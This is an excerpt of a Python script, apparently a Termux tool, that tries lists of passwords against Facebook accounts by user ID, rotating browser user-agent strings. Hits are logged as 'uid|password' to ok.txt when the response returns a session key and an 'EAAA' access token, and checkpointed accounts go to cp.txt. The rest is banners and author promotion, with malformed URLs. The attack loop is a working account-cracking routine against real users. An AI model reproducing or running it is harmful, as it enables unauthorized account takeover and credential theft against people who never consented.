...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m ZOYA QUEEN\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ZOYA QUEEN \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : TERMUX-ZOYA \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook :Zoyaa.Queenn  \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://https://github.com/Zoi-Queen/approval.txt/blob/main/server.txt"])

	#yahan apni facebook id link dalna

	exit(" [=>] FACEBOOK :  https://https://www.facebook.com/Zoyaa.Queenn")
...
def notice():
	...
	os.system("xdg-open https://https://www.facebook.com/Zoyaa.Queenn")
	...
	subprocess.check_output(["am", "start", "https://https://www.facebook.com/Zoyaa.Queenn"])
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m AUTHER   : ZOYA QUEEN \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/Zoyaa.Queenn"])
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=ZOYA=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=ZOYA=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=ZOYA=CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [=ZOYA=CP=>]  %s|%s\n"%(uid, pw))
 ...
 #ZOYA copy krke apna name dal dyna
